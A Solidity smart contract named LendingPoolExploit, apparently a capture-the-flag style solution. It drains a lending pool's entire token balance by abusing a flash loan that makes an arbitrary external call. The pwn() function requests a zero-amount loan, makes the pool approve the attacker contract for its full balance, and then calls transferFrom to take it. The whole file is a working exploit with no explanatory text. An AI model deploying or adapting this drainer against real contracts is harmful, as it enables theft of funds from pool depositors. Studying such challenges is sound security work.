// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {IERC20} from "./IERC20.sol";

interface ILendingPool {
    function token() external view returns (address);

    function flashLoan(
        uint256 amount,
        address target,
        bytes calldata data
    ) external;
}

contract LendingPoolExploit {
    ILendingPool public pool;
    IERC20 public token;

    constructor(address _pool) {
        pool = ILendingPool(_pool);
        token = IERC20(pool.token());
    }

    function pwn() external {
        uint256 bal = token.balanceOf(address(pool));
        pool.flashLoan(
            0,
            address(token),
            abi.encodeWithSelector(token.approve.selector, address(this), bal)
        );
        token.transferFrom(address(pool), address(this), bal);
    }
}
